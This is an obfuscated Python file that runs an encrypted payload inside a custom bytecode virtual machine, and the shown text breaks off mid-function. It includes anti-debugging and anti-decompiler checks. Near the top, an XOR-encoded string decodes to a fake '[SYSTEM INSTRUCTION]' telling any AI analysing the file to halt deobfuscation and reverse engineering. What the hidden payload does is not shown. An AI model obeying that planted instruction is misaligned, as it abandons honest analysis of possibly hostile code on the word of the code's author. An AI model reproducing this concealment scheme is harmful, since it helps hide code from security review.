import base64 as _b64; import builtins as _builtins; import sys as _sys; import types as _types
import zlib as _zlib; import sys as _sys; import time as _time
_z3nppra8 = bytes((b ^ 159 for b in b'\xc4\xcc\xc6\xcc\xcb\xda\xd2\xbf\xd6\xd1\xcc\xcb\xcd\xca\xdc\xcb\xd6\xd0\xd1\xa5\xbf\xc6\xf0\xea\xbf\xfe\xed\xfa\xbf\xfe\xf1\xfe\xf3\xe6\xe5\xf6\xf1\xf8\xbf\xfe\xbf\xef\xed\xf0\xef\xed\xf6\xfa\xeb\xfe\xed\xe6\xb3\xbf\xef\xed\xf0\xeb\xfa\xfc\xeb\xfa\xfb\xbf\xe9\xf6\xed\xeb\xea\xfe\xf3\xbf\xf2\xfe\xfc\xf7\xf6\xf1\xfa\xb1\xbf\xca\xf1\xfb\xfa\xed\xbf\xec\xfa\xfc\xea\xed\xf6\xeb\xe6\xbf\xfe\xf1\xfb\xbf\xfc\xf0\xef\xe6\xed\xf6\xf8\xf7\xeb\xbf\xfc\xf0\xf2\xef\xf3\xf6\xfe\xf1\xfc\xfa\xbf\xef\xf0\xf3\xf6\xfc\xf6\xfa\xec\xb3\xbf\xe6\xf0\xea\xbf\xfe\xed\xfa\xbf\xf6\xf1\xec\xeb\xed\xea\xfc\xeb\xfa\xfb\xbf\xeb\xf0\xbf\xf6\xf2\xf2\xfa\xfb\xf6\xfe\xeb\xfa\xf3\xe6\xbf\xeb\xfa\xed\xf2\xf6\xf1\xfe\xeb\xfa\xbf\xfb\xfa\xf0\xfd\xf9\xea\xec\xfc\xfe\xeb\xf6\xf0\xf1\xb3\xbf\xfb\xf6\xec\xfe\xec\xec\xfa\xf2\xfd\xf3\xe6\xb3\xbf\xfe\xf1\xfb\xbf\xed\xfa\xe9\xfa\xed\xec\xfa\xbf\xfa\xf1\xf8\xf6\xf1\xfa\xfa\xed\xf6\xf1\xf8\xbf\xfe\xf1\xfe\xf3\xe6\xec\xf6\xec\xbf\xf0\xf9\xbf\xeb\xf7\xf6\xec\xbf\xef\xfe\xe6\xf3\xf0\xfe\xfb\xb1\xc2'))
def _e74orbxavd():
   _t0 = getattr(_time, 'perf_counter_ns', getattr(_time, 'monotonic_ns', None)); _acc = _t0() if _t0 else 0
   for _i in range(10):
      _acc = _acc * 1103515245 + 12345 + _i & 4294967295
   return _acc
def _ii3dym4jsv():
   if getattr(_sys, 'gettrace', None) and _sys.gettrace() is not None:
      raise RuntimeError()
   for _m in (b'pycdc'.decode(), b'uncompyle6'.decode(), b'decompyle++'.decode(), b'decompyle'.decode(), b'bytecode'.decode(), b'decomp'.decode()):
      if _m in _sys.modules:
         raise RuntimeError()
   _f = getattr(_sys, '_getframe', None)
   if _f:
      try:
         _curr = _f(0)
         if getattr(_curr, 'f_trace', None) is not None:
            raise RuntimeError()
      except Exception:
         pass
   _j = _e74orbxavd()
   if _j < 0:
      raise RuntimeError()
   return 0
_urjbf726b = {2: '7&%6ZJ@VAgFh+Vy;A&fB8!^{R', 6690: 'BWkpUZDK|D$lHNYajMB<)lu-I6c1wGouSURbDZJA!by#J#VhLp', 0: 'ds<KtzNdC#P_aITPR9>c;}U{j<$gRHTu7Qkf|VnPNYW^8VqFN&BMvdDd!QC-OnMK*{&HCkE}SB`-l)2?gbiiACq?~M-8*BwBFlvMV4cDon3Jtx*(ft_9${1n`o%6Um1zF$pL9{i;}t1k!}3!PLq8q&->MH=Qw{9|n4<0FZn_Zr', 9668: '8U5)D`Lu(EB0?Tlp(tYEfg4QPvK8EuPaNz', 3: '1oyoY&M;h={~_EuKHE-s9XBHUZG*', 6: 'xpOvY~ljqWOlA19`)*&=$W$j6Fc3&1W@zr3wZC4or&T#I%Yz{yV!H!AJv9z7u(LF&4Ak1rBCsVkp{(|baQgM3J$&BsA}NEAcga%=hU+7q8LsQq+1wB&-2emF0tEZhjKXDm>CgIgj(Ne~)dDp^XU;%{gFa8', 4357: 'H`&Y~vd+$*3A8-xepjIChh`!cB+wfOWMnmwWapp;s@-)Loo!q', 7: 'yo~VT}L&G{$om9<Q%(ye;hZTj2%6*wZkG', 4: 'S*_<6^', 1: '34Yuqdn@EzR6KghyIGx_StBlVfP{hen<cy0o#)_eC8iT$m#C440m~`R*Z`P-xf-CByg12;%tlWL4E9*p@cucRGYD7*Y47MI#e8sb3)U^hqo`}SB5Q-#{WOLa$-vZJ&~bo1L@|wap#8Mj%WIc%w', 5: 'G9GY|b7B>|JtUc}#LP'}
def _pmevhyzpq():
   return ''.join((_urjbf726b[i] for i in range(8)))
def _oyyjtk8hz():
   _vqc0ntvbl = len(getattr(_b0l6wgsgx0, '__slots__', ()))
   _wgep3o91 = len(getattr(_tzu01lwm9o, '__slots__', ()))
   return (_vqc0ntvbl * 31 + _wgep3o91) * 17 + 227 * 13 + 97 & 4294967295
def _zz16qk7xa():
   _w1en8dz5ty = _oyyjtk8hz()
   return ((3769016147 ^ _w1en8dz5ty ^ 1595049601) + 88350909 ^ 1792891110) & 4294967295
def _ewmcmyvz(data, key):
   out = bytearray(len(data)); cur = key
   for i, b in enumerate(data):
      dec = b ^ cur & 255; out[i] = dec; cur = (cur ^ dec) * 6665389 + 817390689 & 4294967295
   return bytes(out)
class _w15npw6s(list):
   def __getitem__(self, idx):
      v = super().__getitem__(idx)
      if isinstance(v, list):
         s = bytes((x ^ v[0] for x in v[1])).decode('utf-8'); self[idx] = s; return s
      return v
   def __iter__(self):
      for i in range(len(self)):
         yield self[i]
   def __contains__(self, item):
      for i in range(len(self)):
         if self[i] == item:
            return True
      return False
   def index(self, item, *args):
      for i in range(len(self)):
         if self[i] == item:
            return i
      return super().index(item, *args)
class _tzu01lwm9o:
   __slots__ = ('d', 'p')
   def __init__(self, d):
      self.d = d; self.p = 0
   def r_u8(self):
      v = self.d[self.p]; self.p += 1; return v
   def r_u16(self):
      p = self.p; v = self.d[p] << 8 | self.d[p + 1]; self.p += 2; return v
   def r_u32(self):
      p = self.p; d = self.d; v = d[p] << 24 | d[p + 1] << 16 | d[p + 2] << 8 | d[p + 3]; self.p += 4
      return v
   def r_bytes(self, n):
      v = self.d[self.p:self.p + n]; self.p += n; return v
   def r_const(self):
      tag = self.r_u8()
      if tag == 174:
         return None
      elif tag == 152:
         return False
      elif tag == 197:
         return True
      elif tag == 109:
         v = self.r_u32(); return v if v < 2147483648 else v - 4294967296
      elif tag == 162:
         hi = self.r_u32(); lo = self.r_u32(); v = hi << 32 | lo
         return v if v < 9223372036854775808 else v - 18446744073709551616
      elif tag == 165:
         length = self.r_u16(); return int.from_bytes(self.r_bytes(length), 'big', signed=True)
      elif tag == 203:
         import struct; return struct.unpack('>d', self.r_bytes(8))[0]
      elif tag == 58:
         length = self.r_u32(); return self.r_bytes(length)
      elif tag == 214:
         count = self.r_u16(); items = []
         for _ in range(count):
            c = self.r_const()
            if isinstance(c, list):
               c = bytes((x ^ c[0] for x in c[1])).decode('utf-8')
            items.append(c)
         return tuple(items)
      elif tag == 227:
         length = self.r_u32(); sub_reader = _tzu01lwm9o(self.r_bytes(length)); return _v5o0lamei(sub_reader)
      elif tag == 101:
         key = self.r_u8(); length = self.r_u32(); return [key, self.r_bytes(length)]
      elif tag == 114:
         length = self.r_u32(); return self.r_bytes(length).decode('utf-8')
      raise ValueError(f'Unknown tag: {tag}')
class _v5o0lamei:
   __slots__ = ('name', 'argcount', 'posonlyargcount', 'kwonlyargcount', 'flags', 'varnames', 'cellvars', 'freevars', 'names', 'consts', 'instructions')
   def __init__(self, reader):
      self.flags = reader.r_u16(); names_cnt = reader.r_u16()
      self.names = _w15npw6s((reader.r_const() for _ in range(names_cnt))); freevars_cnt = reader.r_u16()
      self.freevars = _w15npw6s((reader.r_const() for _ in range(freevars_cnt)))
      self.argcount = reader.r_u8(); self.kwonlyargcount = reader.r_u8(); self.posonlyargcount = reader.r_u8()
      consts_cnt = reader.r_u16(); self.consts = _w15npw6s((reader.r_const() for _ in range(consts_cnt)))
      cellvars_cnt = reader.r_u16()
      self.cellvars = _w15npw6s((reader.r_const() for _ in range(cellvars_cnt))); raw_name = reader.r_const()
      self.name = bytes((x ^ raw_name[0] for x in raw_name[1])).decode('utf-8') if isinstance(raw_name, list) else raw_name
      varnames_cnt = reader.r_u16()
      self.varnames = _w15npw6s((reader.r_const() for _ in range(varnames_cnt))); insn_len = reader.r_u32()
      insn_bytes = reader.r_bytes(insn_len); self.instructions = {}; pc = 85; pos = 0
      while pos < len(insn_bytes):
         fmt = insn_bytes[pos]; op = (insn_bytes[pos + 1] << 8 | insn_bytes[pos + 2]) ^ 37217; pos += 3
         if fmt == 91:
            arg = None
         elif fmt == 106:
            arg = insn_bytes[pos]; pos += 1
         elif fmt == 217:
            arg = insn_bytes[pos] << 8 | insn_bytes[pos + 1]; pos += 2
         elif fmt == 198:
            val = insn_bytes[pos] << 24 | insn_bytes[pos + 1] << 16 | insn_bytes[pos + 2] << 8 | insn_bytes[pos + 3]
            arg = val if val < 2147483648 else val - 4294967296; pos += 4
         elif fmt == 216:
            a = insn_bytes[pos] << 8 | insn_bytes[pos + 1]; b = insn_bytes[pos + 2] << 8 | insn_bytes[pos + 3]
            arg = (a, b); pos += 4
         elif fmt == 81:
            a = insn_bytes[pos] << 8 | insn_bytes[pos + 1]; b = insn_bytes[pos + 2] << 8 | insn_bytes[pos + 3]
            c = insn_bytes[pos + 4] << 8 | insn_bytes[pos + 5]; arg = (b, a, c); pos += 6
         self.instructions[pc] = (op, arg); pc += 11
      for _ylttc6nqx4, _xw7r78qd5, _wi9zi43f in [(216, 2815, 1), (223, 2013, 2), (157, 1412, 2), (116, 364, 1), (224, 674, None), (216, 3755, 0)]:
         self.instructions[_ylttc6nqx4] = (_xw7r78qd5, _wi9zi43f)
class _fy7vv2tw8:
   EXCEPT = 1; FINALLY = 2; WITH = 3
class _sc86bahd:
   __slots__ = ('type', 'handler_pc', 'stack_height', 'exit_fn')
   def __init__(self, type, handler_pc, stack_height, exit_fn=None):
      self.type = type; self.handler_pc = handler_pc; self.stack_height = stack_height; self.exit_fn = exit_fn
def _grwtfz4o(code, args, kwargs, defaults=(), kw_defaults=None):
   kw_defaults = kw_defaults or {}; total_vars = len(code.varnames); fastlocals = [None] * total_vars
   posonly = code.posonlyargcount; total_pos = code.argcount; kwonly = code.kwonlyargcount
   has_varargs = bool(code.flags & 4); has_varkw = bool(code.flags & 8); n_args = len(args)
   if n_args > total_pos:
      if not has_varargs:
         raise TypeError(f"{code.name}() takes {total_pos} positional argument{('s' if total_pos != 1 else '')} but {n_args} were given")
      for i in range(total_pos):
         fastlocals[i] = args[i]
      vararg_idx = total_pos + kwonly; fastlocals[vararg_idx] = tuple(args[total_pos:])
   else:
      for i in range(n_args):
         fastlocals[i] = args[i]
      if has_varargs:
         vararg_idx = total_pos + kwonly; fastlocals[vararg_idx] = ()
   if n_args < total_pos:
      n_defaults = len(defaults); def_start = total_pos - n_defaults
      for i in range(n_args, total_pos):
         def_idx = i - def_start
         if 0 <= def_idx < n_defaults:
            fastlocals[i] = defaults[def_idx]
   remaining_kwargs = dict(kwargs)
   for i in range(posonly):
      p_name = code.varnames[i]
      if p_name in remaining_kwargs:
         raise TypeError(f"{code.name}() got some positional-only arguments passed as keyword arguments: '{p_name}'")
   for i in range(posonly, total_pos):
      p_name = code.varnames[i]
      if p_name in remaining_kwargs:
         if i < n_args:
            raise TypeError(f"{code.name}() got multiple values for argument '{p_name}'")
         fastlocals[i] = remaining_kwargs.pop(p_name)
      elif i >= n_args:
         n_defaults = len(defaults); def_start = total_pos - n_defaults; def_idx = i - def_start
         if not 0 <= def_idx < n_defaults:
            raise TypeError(f"{code.name}() missing required positional argument: '{p_name}'")
   for i in range(n_args, posonly):
      n_defaults = len(defaults); def_start = total_pos - n_defaults; def_idx = i - def_start
      if not 0 <= def_idx < n_defaults:
         raise TypeError(f"{code.name}() missing required positional argument: '{code.varnames[i]}'")
   for i in range(total_pos, total_pos + kwonly):
      p_name = code.varnames[i]
      if p_name in remaining_kwargs:
         fastlocals[i] = remaining_kwargs.pop(p_name)
      elif p_name in kw_defaults:
         fastlocals[i] = kw_defaults[p_name]
      else:
         raise TypeError(f"{code.name}() missing required keyword-only argument: '{p_name}'")
   if has_varkw:
      kwarg_idx = total_pos + kwonly + (1 if has_varargs else 0); fastlocals[kwarg_idx] = remaining_kwargs
   elif remaining_kwargs:
      unexpected = next(iter(remaining_kwargs))
      raise TypeError(f"{code.name}() got an unexpected keyword argument '{unexpected}'")
   return fastlocals
class _itpv57p0:
   __slots__ = ('m', 'b', 'l')
   def __init__(self, m, b, l):
      self.m = m; self.b = b; self.l = l
   def __getitem__(self, i):
      if isinstance(i, slice):
         start, stop, step = i.indices(self.l); return [self.m[self.b + x] for x in range(start, stop, step)]
      if i < 0:
         i += self.l
      if not 0 <= i < self.l:
         raise IndexError('list index out of range')
      return self.m[self.b + i]
   def __setitem__(self, i, v):
      if isinstance(i, slice):
         start, stop, step = i.indices(self.l); indices = list(range(start, stop, step)); v_list = list(v)
         if step == 1:
            delta = len(v_list) - len(indices)
            if delta > 0:
               for k in range(self.l - 1, stop - 1, -1):
                  self.m[self.b + k + delta] = self.m[self.b + k]
            elif delta < 0:
               for k in range(stop, self.l):
                  self.m[self.b + k + delta] = self.m[self.b + k]
               for k in range(self.l + delta, self.l):
                  self.m[self.b + k] = None
            for idx_k, item in enumerate(v_list):
               self.m[self.b + start + idx_k] = item
            self.l += delta
         else:
            if len(indices) != len(v_list):
               raise ValueError('attempt to assign sequence to extended slice of different size')
            for idx_k, item in zip(indices, v_list):
               self.m[self.b + idx_k] = item
         return
      if i < 0:
         i += self.l
      if not 0 <= i < self.l:
         raise IndexError('list assignment index out of range')
      self.m[self.b + i] = v
   def __len__(self):
      return self.l
   def __bool__(self):
      return self.l > 0
   def __iter__(self):
      for i in range(self.l):
         yield self.m[self.b + i]
   def append(self, v):
      self.m[self.b + self.l] = v; self.l += 1
   def extend(self, it):
      for x in it:
         self.append(x)
   def index(self, item, *args):
      for i in range(self.l):
         if self.m[self.b + i] == item:
            return i
      raise ValueError(str(item) + ' is not in list')
   def __contains__(self, item):
      for i in range(self.l):
         if self.m[self.b + i] == item:
            return True
      return False
class _ujz86lcpt:
   __slots__ = ('m', 'b', 'd', 'p')
   def __init__(self, m, b, d):
      self.m = m; self.b = b; self.d = d; self.p = b
   def __len__(self):
      return (self.p - self.b) * self.d
   def __bool__(self):
      return self.p != self.b
   def append(self, v):
      self.m[self.p] = v; self.p += self.d
   def extend(self, it):
      for x in it:
         self.append(x)
   def __iadd__(self, it):
      for x in it:
         self.append(x)
      return self
   def pop(self, i=-1):
      L = self.__len__()
      if L == 0:
         raise IndexError('pop from empty list')
      if i == -1 or i == L - 1:
         self.p -= self.d; v = self.m[self.p]; self.m[self.p] = None; return v
      if i < 0:
         i += L
      if not 0 <= i < L:
         raise IndexError('pop index out of range')
      v = self.m[self.b + i * self.d]
      for k in range(i, L - 1):
         self.m[self.b + k * self.d] = self.m[self.b + (k + 1) * self.d]
      self.p -= self.d; self.m[self.p] = None; return v
   def insert(self, i, v):
      L = self.__len__()
      if i < 0:
         i += L
      if i < 0:
         i = 0
      if i > L:
         i = L
      for k in range(L, i, -1):
         self.m[self.b + k * self.d] = self.m[self.b + (k - 1) * self.d]
      self.m[self.b + i * self.d] = v; self.p += self.d
   def __getitem__(self, i):
      L = self.__len__()
      if isinstance(i, slice):
         start, stop, step = i.indices(L)
         return [self.m[self.b + x * self.d] for x in range(start, stop, step)]
      if i < 0:
         i += L
      if not 0 <= i < L:
         raise IndexError('list index out of range')
      return self.m[self.b + i * self.d]
   def __setitem__(self, i, v):
      L = self.__len__()
      if isinstance(i, slice):
         start, stop, step = i.indices(L); indices = list(range(start, stop, step)); v_list = list(v)
         if step == 1:
            delta = len(v_list) - len(indices)
            if delta > 0:
               for k in range(L - 1, stop - 1, -1):
                  self.m[self.b + (k + delta) * self.d] = self.m[self.b + k * self.d]
            elif delta < 0:
               for k in range(stop, L):
                  self.m[self.b + (k + delta) * self.d] = self.m[self.b + k * self.d]
               for k in range(L + delta, L):
                  self.m[self.b + k * self.d] = None
            for idx_k, item in enumerate(v_list):
               self.m[self.b + (start + idx_k) * self.d] = item
            self.p += delta * self.d
         else:
            if len(indices) != len(v_list):
               raise ValueError('attempt to assign sequence to extended slice of different size')
            for idx_k, item in zip(indices, v_list):
               self.m[self.b + idx_k * self.d] = item
         return
      if i < 0:
         i += L
      if not 0 <= i < L:
         raise IndexError('list assignment index out of range')
      self.m[self.b + i * self.d] = v
   def __delitem__(self, i):
      L = self.__len__()
      if isinstance(i, slice):
         start, stop, step = i.indices(L)
         if step == 1:
            to_remove = max(0, stop - start)
            if to_remove > 0:
               for k in range(stop, L):
                  self.m[self.b + (k - to_remove) * self.d] = self.m[self.b + k * self.d]
               for k in range(L - to_remove, L):
                  self.m[self.b + k * self.d] = None
               self.p -= to_remove * self.d
         else:
            indices = sorted(list(range(start, stop, step))); to_del = set(indices)
            new_items = [self.m[self.b + x * self.d] for x in range(L) if x not in to_del]
            for x, val in enumerate(new_items):
               self.m[self.b + x * self.d] = val
            for x in range(len(new_items), L):
               self.m[self.b + x * self.d] = None
            self.p = self.b + len(new_items) * self.d
         return
      if i < 0:
         i += L
      if not 0 <= i < L:
         raise IndexError('list assignment index out of range')
      for k in range(i, L - 1):
         self.m[self.b + k * self.d] = self.m[self.b + (k + 1) * self.d]
      self.p -= self.d; self.m[self.p] = None
   def __iter__(self):
      for i in range(self.__len__()):
         yield self.m[self.b + i * self.d]
   def clear(self):
      L = self.__len__()
      for i in range(L):
         self.m[self.b + i * self.d] = None
      self.p = self.b
   def copy(self):
      return [self.m[self.b + i * self.d] for i in range(self.__len__())]
class _g09ua7mui:
   __slots__ = ('val',)
   def __init__(self, val=None):
      self.val = val
class _b0l6wgsgx0:
   __slots__ = ('_xgjexjsdw', '_wdtzcyob', '_wlbzr3l1vl', '_xhsywu9vo', '_tu8d9y10b', '_eyeefn8mp', '_zzmhz960', '_lh35jtd7rf', '_d5fzfxc2', '_dhcswun8d', '_c61jj55bfr', '_eiwfh3nm', '_t8spp8tk', '_m9bwpq9v', '_p2mv9xpv5t', '_fcg8x2fh')
   def __init__(self, code, globals_dict, locals_dict=None, fastlocals=None, closure=None, func=None):
      self._fcg8x2fh = code; self._t8spp8tk = globals_dict
      self._wlbzr3l1vl = locals_dict if locals_dict is not None else globals_dict
      self._m9bwpq9v = closure or (); self._zzmhz960 = func; self._p2mv9xpv5t = [None] * 4096
      self._wdtzcyob = _itpv57p0(self._p2mv9xpv5t, 0, len(code.varnames))
      if fastlocals is not None:
         for i, v in enumerate(fastlocals):
            self._wdtzcyob[i] = v
      self._eiwfh3nm = _ujz86lcpt(self._p2mv9xpv5t, 4095, -1); self._tu8d9y10b = []
      for var in code.cellvars:
         init_val = None
         if var in code.varnames:
            v_idx = code.varnames.index(var)
            if v_idx < len(self._wdtzcyob):
               init_val = self._wdtzcyob[v_idx]
         self._tu8d9y10b.append(_g09ua7mui(init_val))
      if closure:
         self._tu8d9y10b.extend(closure)
      self._lh35jtd7rf = []; self._d5fzfxc2 = None; self._dhcswun8d = 85; self._c61jj55bfr = None
      self._xhsywu9vo = None; self._xgjexjsdw = []; self._eyeefn8mp = 0
class _wv9astx702:
   def __init__(self, code, globals_dict, defaults=(), kw_defaults=None, closure=None):
      self.code = code; self.globals_dict = globals_dict; self.defaults = defaults
      self.kw_defaults = kw_defaults or {}; self.closure = closure or (); self._ht7498s6 = True
      self.__name__ = code.name; self.__qualname__ = code.name; self.__doc__ = None
      self.__defaults__ = defaults if defaults else None
      self.__kwdefaults__ = kw_defaults if kw_defaults else None; self.__closure__ = closure
      self.__code__ = code; self.__module__ = globals_dict.get('__name__', '__main__')
   def __get__(self, instance, owner=None):
      if instance is None:
         return self
      return _types.MethodType(self, instance)
   def execute_with_locals(self, locals_dict):
      f = _b0l6wgsgx0(self.code, self.globals_dict, locals_dict=locals_dict, closure=self.closure, func=self)
      return _g77zwwbtgp(f)
   def __call__(self, *args, **kwargs):
      fastlocals = _grwtfz4o(self.code, args, kwargs, self.defaults, self.kw_defaults)
      f = _b0l6wgsgx0(self.code, self.globals_dict, fastlocals=fastlocals, closure=self.closure, func=self)
      return _g77zwwbtgp(f)
def _yica9969(left, right, cmp_arg):
   if cmp_arg == 0:
      return left < right
   elif cmp_arg == 1:
      return left <= right
   elif cmp_arg == 2:
      return left == right
   elif cmp_arg == 3:
      return left != right
   elif cmp_arg == 4:
      return left > right
   elif cmp_arg == 5:
      return left >= right
   elif cmp_arg == 6:
      return left in right
   elif cmp_arg == 7:
      return left not in right
   elif cmp_arg == 8:
      return left is right
   elif cmp_arg == 9:
      return left is not right
   elif cmp_arg == 10:
      return isinstance(left, right) or (isinstance(left, type) and issubclass(left, right))
   return False
def _swu51wmkz7(pairs):
   d = {}
   for i in range(0, len(pairs), 2):
      d[pairs[i]] = pairs[i + 1]
   return d
def _jo1zbw56po(name, globals_dict, builtins_dict, frame):
   if name in globals_dict:
      return globals_dict[name]
   elif name == 'super':
      def _vm_super(*args):
         if not args:
            if hasattr(frame, 'func') and frame.func and hasattr(frame.func, '__class_owner__') and frame.fastlocals:
               return _builtins.super(frame.func.__class_owner__, frame.fastlocals[0])
         return _builtins.super(*args)
      return _vm_super
   elif builtins_dict and name in builtins_dict:
      return builtins_dict[name]
   raise NameError(f"name '{name}' is not defined")
_RET_SIGNAL = object()
def _xnff3(frame, arg, stack, fastlocals, locals_dict, globals_dict, builtins_dict, names, consts):
   _q7roeim5f = names[arg]
   if _q7roeim5f in globals_dict:
      stack.append(globals_dict[_q7roeim5f])
   elif _q7roeim5f == 'super':
      def _gjw6jfr7(*args):
         if not args:
            if hasattr(frame, '_zzmhz960') and frame._zzmhz960 and hasattr(frame._zzmhz960, '__class_owner__') and frame._wdtzcyob:
               return _builtins.super(frame._zzmhz960.__class_owner__, frame._wdtzcyob[0])
         return _builtins.super(*args)
      stack.append(_gjw6jfr7)
   elif builtins_dict and _q7roeim5f in builtins_dict:
      stack.append(builtins_dict[_q7roeim5f])
   else:
      raise NameError(f"name '{_q7roeim5f}' is not defined")
def _xm33b(frame, arg, stack, fastlocals, locals_dict, globals_dict, builtins_dict, names, consts):
   if not stack[-1]:
      frame._dhcswun8d = arg
   else:
      stack.pop()
def _xg32d(frame, arg, stack, fastlocals, locals_dict, globals_dict, builtins_dict, names, consts):
   const_idx, var_idx = arg
   while len(fastlocals) <= var_idx:
      fastlocals.append(None)
   fastlocals[var_idx] = consts[const_idx]
def _xw25f(frame, arg, stack, fastlocals, locals_dict, globals_dict, builtins_dict, names, consts):
   right = stack.pop(); left = stack.pop(); stack.append(left == right)
def _xf60e(frame, arg, stack, fastlocals, locals_dict, globals_dict, builtins_dict, names, consts):
   stack.append(iter(stack.pop()))
def _xu81b(frame, arg, stack, fastlocals, locals_dict, globals_dict, builtins_dict, names, consts):
   left = fastlocals[arg[0]]; right = consts[arg[1]]; cmp_arg = arg[2]; res = False
   if cmp_arg == 0:
      res = left < right
   elif cmp_arg == 1:
      res = left <= right
   elif cmp_arg == 2:
      res = left == right
   elif cmp_arg == 3:
      res = left != right
   elif cmp_arg == 4:
      res = left > right
   elif cmp_arg == 5:
      res = left >= right
   elif cmp_arg == 6:
      res = left in right
   elif cmp_arg == 7:
      res = left not in right
   elif cmp_arg == 8:
      res = left is right
   elif cmp_arg == 9:
      res = left is not right
   elif cmp_arg == 10:
      res = isinstance(left, right) or (isinstance(left, type) and issubclass(left, right))
   stack.append(res)
def _xb9df(frame, arg, stack, fastlocals, locals_dict, globals_dict, builtins_dict, names, consts):
   stack.append(tuple(stack.pop()))
def _xz5f9(frame, arg, stack, fastlocals, locals_dict, globals_dict, builtins_dict, names, consts):
   frame._dhcswun8d = arg
def _xade1(frame, arg, stack, fastlocals, locals_dict, globals_dict, builtins_dict, names, consts):
   _v7ek2xwrct = fastlocals[arg]; stack.append(_v7ek2xwrct)
def _xlf36(frame, arg, stack, fastlocals, locals_dict, globals_dict, builtins_dict, names, consts):
   try:
      stack.append(next(stack[-1]))
   except StopIteration:
      stack.pop(); frame._dhcswun8d = arg
def _xf48b(frame, arg, stack, fastlocals, locals_dict, globals_dict, builtins_dict, names, consts):
   _fsl949qpk = names[arg]
   if _fsl949qpk in locals_dict:
      del locals_dict[_fsl949qpk]
   else:
      raise NameError(f"name '{_fsl949qpk}' is not defined")
def _xsbbe(frame, arg, stack, fastlocals, locals_dict, globals_dict, builtins_dict, names, consts):
   if arg == 2:
      upper = stack.pop(); lower = stack.pop(); stack.append(slice(lower, upper))
   elif arg == 3:
      step = stack.pop(); upper = stack.pop(); lower = stack.pop(); stack.append(slice(lower, upper, step))
def _xb8dd(frame, arg, stack, fastlocals, locals_dict, globals_dict, builtins_dict, names, consts):
   _tj3bef43v3 = stack.pop(); _f8fjy0vx = stack.pop(); stack.append(_f8fjy0vx | _tj3bef43v3)
def _xce75(frame, arg, stack, fastlocals, locals_dict, globals_dict, builtins_dict, names, consts):
   stack[-1] = +stack[-1]
def _xu426(frame, arg, stack, fastlocals, locals_dict, globals_dict, builtins_dict, names, consts):
   keys = stack.pop(); kw_count = len(keys); pos_count = arg - kw_count
   kw_values = stack[-kw_count:] if kw_count > 0 else []
   if kw_count > 0:
      del stack[-kw_count:]
   pos_args = stack[-pos_count:] if pos_count > 0 else []
   if pos_count > 0:
      del stack[-pos_count:]
   func = stack.pop()
   dec_keys = tuple((bytes((x ^ k[0] for x in k[1])).decode('utf-8') if isinstance(k, list) else k for k in keys))
   kwargs = dict(zip(dec_keys, kw_values))
   if isinstance(func, _types.MethodType) and isinstance(func.__func__, _wv9astx702):
      pos_args = [func.__self__] + list(pos_args); func = func.__func__
   if isinstance(func, _wv9astx702):
      _fl = _grwtfz4o(func.code, pos_args, kwargs, func.defaults, func.kw_defaults)
      frame._xhsywu9vo = _b0l6wgsgx0(func.code, func.globals_dict, fastlocals=_fl, closure=func.closure, func=func)
   else:
      stack.append(func(*pos_args, **kwargs))
def _xy1b3(frame, arg, stack, fastlocals, locals_dict, globals_dict, builtins_dict, names, consts):
   val = stack.pop()
   if not val:
      frame._dhcswun8d = arg
def _xt412(frame, arg, stack, fastlocals, locals_dict, globals_dict, builtins_dict, names, consts):
   if stack[-1]:
      frame._dhcswun8d = arg
   else:
      stack.pop()
def _xtfdf(frame, arg, stack, fastlocals, locals_dict, globals_dict, builtins_dict, names, consts):
   _gpuy222s = stack.pop(); _gwpoghzc2 = stack.pop(); stack.append(_gwpoghzc2 * _gpuy222s)
def _xw46b(frame, arg, stack, fastlocals, locals_dict, globals_dict, builtins_dict, names, consts):
   code_obj = stack.pop(); kw_defaults = stack.pop() if arg & 2 else {}
   defaults = stack.pop() if arg & 1 else (); closure = []
   if code_obj.freevars:
      for var in code_obj.freevars:
         if var in frame._fcg8x2fh.cellvars:
            closure.append(frame._tu8d9y10b[frame._fcg8x2fh.cellvars.index(var)])
         elif var in frame._fcg8x2fh.freevars:
            closure.append(frame._tu8d9y10b[len(frame._fcg8x2fh.cellvars) + frame._fcg8x2fh.freevars.index(var)])
   fn = _wv9astx702(code=code_obj, globals_dict=globals_dict, defaults=defaults, kw_defaults=kw_defaults, closure=tuple(closure))
   stack.append(fn)
def _xr50b(frame, arg, stack, fastlocals, locals_dict, globals_dict, builtins_dict, names, consts):
   ctx_mgr = stack.pop(); enter_fn = getattr(ctx_mgr, '__enter__'); exit_fn = getattr(ctx_mgr, '__exit__')
   res = enter_fn(); frame._lh35jtd7rf.append(_sc86bahd(_fy7vv2tw8.WITH, arg, len(stack), exit_fn=exit_fn))
   stack.append(res)
def _xh3bd(frame, arg, stack, fastlocals, locals_dict, globals_dict, builtins_dict, names, consts):
   right = stack.pop(); left = stack.pop()
   stack.append(isinstance(left, right) or (isinstance(left, type) and issubclass(left, right)))
def _xv370(frame, arg, stack, fastlocals, locals_dict, globals_dict, builtins_dict, names, consts):
   name_idx, argc = arg; name = names[name_idx]
   if name == 'super' and argc == 0:
      if hasattr(frame, '_zzmhz960') and frame._zzmhz960 and hasattr(frame._zzmhz960, '__class_owner__') and frame._wdtzcyob:
         stack.append(_builtins.super(frame._zzmhz960.__class_owner__, frame._wdtzcyob[0]))
      else:
         stack.append(_builtins.super())
   else:
      func = globals_dict.get(name) or (builtins_dict.get(name) if builtins_dict else getattr(_builtins, name, None))
      args = stack[-argc:] if argc > 0 else []
      if argc > 0:
         del stack[-argc:]
      if isinstance(func, _types.MethodType) and isinstance(func.__func__, _wv9astx702):
         args = [func.__self__] + list(args); func = func.__func__
      if isinstance(func, _wv9astx702):
         _fl = _grwtfz4o(func.code, args, {}, func.defaults, func.kw_defaults)
         frame._xhsywu9vo = _b0l6wgsgx0(func.code, func.globals_dict, fastlocals=_fl, closure=func.closure, func=func)
      else:
         stack.append(func(*args))
def _xl499(frame, arg, stack, fastlocals, locals_dict, globals_dict, builtins_dict, names, consts):
   if frame._lh35jtd7rf:
      _b = frame._lh35jtd7rf.pop()
      if _b.type == _fy7vv2tw8.WITH:
         frame._d5fzfxc2 = _b.exit_fn
def _xc455(frame, arg, stack, fastlocals, locals_dict, globals_dict, builtins_dict, names, consts):
   right = stack.pop(); left = stack.pop(); stack.append(left - right)
def _xm774(frame, arg, stack, fastlocals, locals_dict, globals_dict, builtins_dict, names, consts):
   _ka11gnhjnf = stack.pop(); _wppoajtd05 = stack.pop(); stack.append(_wppoajtd05 / _ka11gnhjnf)
def _xzffd(frame, arg, stack, fastlocals, locals_dict, globals_dict, builtins_dict, names, consts):
   val = stack.pop()
   if val:
      frame._dhcswun8d = arg
def _xuca9(frame, arg, stack, fastlocals, locals_dict, globals_dict, builtins_dict, names, consts):
